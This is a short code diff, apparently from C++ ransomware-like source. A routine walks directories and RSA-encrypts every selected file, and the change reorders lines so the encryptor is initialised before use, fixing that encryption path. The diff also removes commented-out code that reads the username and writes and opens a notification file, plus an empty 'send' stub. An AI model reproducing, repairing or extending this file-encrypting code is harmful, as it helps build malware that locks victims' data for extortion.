@@ -549,9 +549,9 @@ static void iterate(const path& parent, const string & mod,
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			status = encrypt(path, rsaEncryptor);
 			RsaEncryptor rsaEncryptor;
 			rsaEncryptor.init_Encryptor(mod, exp);
+			status = encrypt(path, rsaEncryptor);
 			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
 			if(!NT_SUCCESS(status))
 			{
@@ -571,41 +571,3 @@ static void iterate(const path& parent, const string & mod,
 		}
 	}
 }
-
-
-//string get_username() {
-//#ifdef _WIN32
-//	char username[UNLEN + 1];
-//	DWORD length = UNLEN + 1;
-//	GetUserName(username, &length);
-//
-//	return string(username);
-//#else
-//	struct passwd *pw;
-//
-//	uid_t uid = geteuid();
-//	pw = getpwuid(uid);
-//	if (pw) {
-//		return string(pw->pw_name);
-//	}
-//
-//	return EMPTY;
-//#endif
-//}
-//
-
-//}
-//
-//void notify() {
-//	if (OPEN_FILE) {
-//		std::ofstream ofile(NOTIFY_FILENAME);
-//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
-//		ofile.close();
-//
-//		system((string("start ") + NOTIFY_FILENAME).c_str());
-//	}
-//}
-//
-//void send() {
-//
-//}
